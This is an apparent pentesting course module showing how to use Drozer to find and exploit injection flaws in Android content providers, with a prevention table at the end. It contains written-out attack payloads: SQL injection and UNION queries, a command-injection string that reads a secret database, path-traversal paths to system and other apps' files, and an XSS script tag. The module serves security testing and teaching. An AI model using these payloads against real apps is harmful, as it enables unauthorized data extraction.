# Module 08: Scanning Vulnerability with Drozer - Injection Attacks

## What are Injection Attacks?

Injection attacks happen when an attacker sends malicious data to an app and the app executes it as code. The most common type is SQL injection. Drozer can test for injection vulnerabilities in content providers.

## SQL Injection in Content Providers

Content providers often use SQLite databases. If the provider does not sanitize input, attackers can inject SQL commands.

### How SQL Injection Works

Normal query:
```
content://com.example.app/users?id=1
```

This becomes:
```sql
SELECT * FROM users WHERE id = 1
```

Injected query:
```
content://com.example.app/users?id=1 OR 1=1
```

This becomes:
```sql
SELECT * FROM users WHERE id = 1 OR 1=1
```

Since 1=1 is always true, this returns ALL users instead of just one.

### Testing with Drozer

**Step 1: Find content providers**

```
dz> run app.provider.info -a com.example.targetapp
```

**Step 2: Test for SQL injection**

```
dz> run scanner.provider.injection -a com.example.targetapp
```

**Output:**
```
Scanner is testing:
  content://com.example.targetapp.database/users
  content://com.example.targetapp.database/notes

Injection in content://com.example.targetapp.database/users
  URI: content://com.example.targetapp.database/users
  SQL Injection: True
  Projection Injection: True
  Selection Injection: True
```

**Step 3: Exploit the injection**

```
dz> run app.provider.query content://com.example.targetapp.database/users
    --selection "1=1"
```

This returns all rows because the condition is always true.

### Types of SQL Injection Tests

#### 1. Projection Injection

Projection is the column names you want to select.

**Test:**
```
dz> run app.provider.query content://com.example.targetapp/users
    --projection "1=1)"
```

If this returns data, projection injection is possible.

#### 2. Selection Injection

Selection is the WHERE clause.

**Test:**
```
dz> run app.provider.query content://com.example.targetapp/users
    --selection "1=1"
```

If this returns all rows, selection injection is possible.

#### 3. Union Injection

You can use UNION to read data from other tables.

**Test:**
```
dz> run app.provider.query content://com.example.targetapp/users
    --selection "1=1 UNION SELECT * FROM sqlite_master"
```

This might show all tables in the database.

## Command Injection

Command injection happens when the app executes system commands based on user input.

### Testing with Drozer

Drozer cannot directly test command injection. But you can look for vulnerable patterns.

**Vulnerable code:**
```java
Runtime.getRuntime().exec("ping " + userInput);
```

**Attack:**
```
ping 8.8.8.8; cat /data/data/com.example.app/databases/secret.db
```

This executes both the ping command and the database extraction command.

## File Inclusion / Path Traversal

Path traversal lets attackers read files outside the intended directory.

### Testing with Drozer

**Step 1: Scan for traversal**

```
dz> run scanner.provider.traversal -a com.example.targetapp
```

**Output:**
```
Path traversal in content://com.example.targetapp.database/files
  URI: content://com.example.targetapp.database/files
  Traversal: True
```

**Step 2: Exploit traversal**

```
dz> run app.provider.read content://com.example.targetapp.database/files/../../../etc/hosts
```

This attempts to read system files outside the app directory.

**Common traversal payloads:**
```
../../../../etc/hosts
../../../../data/data/com.example.other/databases/data.db
../../../../system/build.prop
../private_files/secret.txt
```

## WebView Injection

If the app uses WebView and your injected data appears in it, you might be able to execute JavaScript.

### How It Works

1. You inject JavaScript code via the content provider
2. The app displays this data in a WebView
3. JavaScript executes in the WebView context

**Injection payload:**
```
<script>alert('XSS')</script>
```

**Using Drozer to test:**
```
dz> run app.provider.insert content://com.example.targetapp/notes
    --string title "Test"
    --string content "<script>alert('XSS')</script>"
```

Then open the app to see if the script executes.

## Injection Attack Methodology

```
Step 1: Identify entry points (content providers, input fields)
Step 2: Test for injection vulnerabilities
Step 3: Determine the type of injection (SQL, command, traversal)
Step 4: Exploit to extract data
Step 5: Document findings
```

## Prevention

| Vulnerability | Prevention |
|---------------|------------|
| SQL Injection | Use parameterized queries |
| Command Injection | Avoid Runtime.exec() with user input |
| Path Traversal | Validate file paths, use whitelist |
| XSS | Sanitize HTML output, use Content Security Policy |

## Summary

Injection attacks are a serious threat to Android apps. Drozer can test for SQL injection, path traversal, and other injection vulnerabilities in content providers. Always use parameterized queries and validate all input to prevent injection attacks.